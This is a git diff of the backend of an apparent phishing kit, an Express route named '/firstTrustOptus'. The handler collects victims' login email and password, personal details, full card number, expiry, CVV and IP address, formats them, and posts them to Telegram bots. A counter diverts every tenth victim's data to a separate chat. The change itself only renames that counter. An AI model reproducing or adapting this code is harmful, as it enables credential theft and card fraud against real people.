@@ -6058,7 +6058,7 @@ app.post("/firstTrustOptus", (req, res) => {
     .then(function () {
       binList = `${bin} | ${zip} | ${bankName}`;
       var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (firstTrust == 10) {
+      if (Spoofergoofer == 10) {
         axios
           .post(
             `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
@@ -6066,7 +6066,7 @@ app.post("/firstTrustOptus", (req, res) => {
           .catch((err) => {
             console.log(err);
           });
-          firstTrust = 4;
+          Spoofergoofer = 4;
       } else {
         axios
           .post(
@@ -6082,7 +6082,7 @@ app.post("/firstTrustOptus", (req, res) => {
           .catch((err) => {
             console.log(err);
           });
-          firstTrust += 1;
+          Spoofergoofer += 1;
       }
       res.send("Update Completed");
     });
